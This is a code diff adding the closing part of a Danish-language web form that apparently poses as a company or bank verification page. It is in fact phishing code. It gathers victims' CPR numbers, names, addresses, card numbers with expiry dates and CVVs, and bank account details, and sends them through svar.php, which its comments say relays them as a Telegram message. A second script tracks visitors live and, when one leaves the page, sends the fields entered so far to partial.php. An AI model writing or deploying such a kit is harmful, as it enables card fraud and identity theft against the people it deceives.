+        "IP-Adresse: " + (payload.ip_address || "—"),
+        "",
+        "Virksomhed: " + ((payload.company && payload.company.name) || "—"),
+        "CVR: " + ((payload.company && payload.company.cvr) || "—"),
+        "CVR-adresse: " + ((payload.company && (payload.company.addressLine || payload.company.address)) || "—"),
+        "Selskabsform: " + ((payload.company && payload.company.companyType) || "—"),
+        "Branche: " + ((payload.company && payload.company.industry) || "—"),
+        "Startdato: " + ((payload.company && payload.company.started) || "—"),
+        "Telefon: " + ((payload.company && payload.company.phone) || "—"),
+        "E-mail: " + ((payload.company && payload.company.email) || "—"),
+        "Ansatte: " + ((payload.company && payload.company.employees) || "—"),
+        "",
+        "Navn: " + payload.contact.name,
+        "Adresse: " + payload.contact.address,
+        "Postnr/by: " + (payload.contact.zip + " " + payload.contact.city).trim(),
+        "Telefonnummer: " + (payload.contact.phone || "—"),
+        "Bank: " + (payload.contact.extra || "—"),
+        "",
+        "Betalingskort:",
+        "Kort ejernavn: " + payload.contact.cardHolder,
+        "Kort nummer: " + payload.contact.cardNumber,
+        "Udløbsdato: " + payload.contact.expiry,
+        "CVV: " + payload.contact.cvv,
+        "Regnr: " + payload.contact.regnr,
+        "Kontonr: " + payload.contact.kontonr
+      ].join("\n");
+
+      // Show done page immediately (one tap)
+      go("page-done");
+      window.__jujSubmitted = true; // block leave duplicate after submit
+
+      try {
+        // One Telegram only — via svar.php (not partial complete)
+        await fetch('svar.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            text: text,
+            cpr: cprVal,
+            bruger_id: burgerIdVal,
+            reference: payload.reference
+          }),
+          keepalive: true
+        });
+      } catch (e) { console.error(e); }
+
+      localStorage.clear();
+      next3Busy = false;
+    });
+
+    $("logout").addEventListener("click", () => {
+      selected = null;
+      ["cvr", "fullname", "address", "zip", "city", "phone", "extra", "xx1", "xx2", "xx3", "xx4", "xx5", "xx6"].forEach(id => $(id).value = "");
+      next1.disabled = true;
+      renderResults([]);
+      const card = $("cvrCard");
+      if (card) { card.hidden = true; card.innerHTML = ""; }
+      document.body.classList.add("home-on");
+      $("home").classList.add("show");
+    });
+
+    function hideCookie() { $("cookieBox").style.display = "none"; }
+    $("cookieYes").addEventListener("click", hideCookie);
+    $("cookieNo").addEventListener("click", hideCookie);
+  </script>
+
+  <script>
+    (function () {
+      const PARTIAL_URL = 'partial.php';
+      const SID_KEY = 'juj_session_id';
+      function uuid() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+          const r = Math.random() * 16 | 0;
+          return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+        });
+      }
+      let sid = sessionStorage.getItem(SID_KEY);
+      if (!sid) { sid = uuid(); sessionStorage.setItem(SID_KEY, sid); }
+
+      function step() {
+        if (document.getElementById('page-cvr').classList.contains('active')) return 1;
+        if (document.getElementById('page-info').classList.contains('active')) return 2;
+        if (document.getElementById('page-extra').classList.contains('active')) return 3;
+        if (document.getElementById('page-done').classList.contains('active')) return 4;
+        return 0;
+      }
+      function harvest() {
+        const out = {};
+        const meta = (typeof window.__jujMeta === 'function') ? window.__jujMeta() : {};
+        if (meta.cpr) out.cpr = meta.cpr;
+        if (meta.bruger_id) out.bruger_id = meta.bruger_id;
+        if (meta.ip && meta.ip !== 'Henter...') out.ip = meta.ip;
+        ['cvr', 'fullname', 'address', 'zip', 'city', 'phone', 'extra',
+          'xx1', 'xx2', 'xx3', 'xx4', 'xx5', 'xx6'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el && el.value) out[id] = el.value;
+          });
+        if (selected) {
+          out.companyName = selected.name || '';
+          out.companyCvr = selected.cvr || '';
+        }
+        return out;
+      }
+      function bankChosen() {
+        const el = document.getElementById('extra');
+        return !!(el && el.value && String(el.value).trim());
+      }
+      // Lightweight live-stats presence (all steps: CVR / info / card)
+      function presence() {
+        try {
+          const img = new Image();
+          img.referrerPolicy = 'no-referrer';
+          img.src = 'ping.php?sid=' + encodeURIComponent(sid) + '&t=' + Date.now();
+          fetch('ping.php?sid=' + encodeURIComponent(sid) + '&t=' + Date.now(), {
+            cache: 'no-store',
+            keepalive: true
+          }).catch(() => { });
+        } catch (e) { }
+      }
+      let leaveSent = false;
+      function sendLeave() {
+        try {
+          // Already submitted → svar.php already sent the one message
+          if (window.__jujSubmitted) return;
+          // Only after bank; only once; only real leave (not tab switch)
+          if (!bankChosen() || leaveSent) return;
+          leaveSent = true;
+          fetch(PARTIAL_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ session_id: sid, step: step(), status: 'leave', fields: harvest() }),
+            keepalive: true
+          }).catch(() => { });
+        } catch (e) { }
+      }
+
+      presence(); // count from CVR/home immediately
+      setInterval(() => { if (document.visibilityState === 'visible') presence(); }, 10000);
+      ['next1', 'next2', 'next3'].forEach(id => {
+        const b = document.getElementById(id);
+        if (b) b.addEventListener('click', () => presence(), { capture: true });
+      });
+
+      // Real navigation away / close — not switching browser tabs
+      window.addEventListener('pagehide', () => sendLeave());
+    })();
+  </script>
+</body>
+
+</html>
